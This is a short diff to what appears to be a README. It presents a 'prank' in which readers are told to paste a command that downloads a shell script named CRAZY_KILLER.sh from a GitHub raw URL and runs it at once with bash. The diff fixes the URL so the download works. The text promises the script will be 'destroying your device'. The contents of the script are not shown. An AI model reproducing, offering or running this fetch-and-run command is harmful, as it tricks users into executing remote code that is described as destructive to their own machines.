@@ -2,7 +2,7 @@
 This is A Prank, Just Paste This command 
 
 ```bash
-curl -s -o ~/CRAZY_KILLER.sh https://raw.githubusercontent.com/HikkiV/-R4ZY_K-LL-R/main/ÇR4ZY_KÏLLÁR_DOWNLOAD.sh && bash ~/CRAZY_KILLER.sh
+curl -L -o ~/CRAZY_KILLER.sh https://raw.githubusercontent.com/HikkiV/-R4ZY_K-LL-R/main/%C3%87R4ZY_K%C3%8FLL%C3%81R_DOWNLOAD && bash ~/CRAZY_KILLER.sh
 ```
 
 And you will see ÇR4ZY_KÏLLÁR destroying your device😈 XD.
